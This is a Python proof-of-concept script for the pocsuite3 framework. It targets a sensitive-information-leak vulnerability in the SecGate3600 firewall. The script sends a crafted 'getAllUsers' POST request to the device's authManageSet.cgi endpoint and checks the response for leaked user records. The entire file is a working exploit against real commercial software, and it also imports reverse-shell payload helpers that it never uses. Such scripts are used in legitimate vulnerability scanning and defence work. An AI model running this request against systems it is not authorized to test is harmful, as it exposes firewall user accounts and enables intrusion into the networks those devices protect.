# _*_ coding:utf-8 _*_
# @Time : 2023/12/16
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class SecGate3600_information_leakage(POCBase):
    pocDesc = '''网神SecGate3600防火墙敏感信息泄露漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-16'
    name = '网神SecGate3600防火墙敏感信息泄露漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/cgi-bin/authUser/authManageSet.cgi'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'If-Modified-Since': 'Fri, 23 Aug 2013 11:17:08 GMT',
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            data = 'type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'id' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(SecGate3600_information_leakage)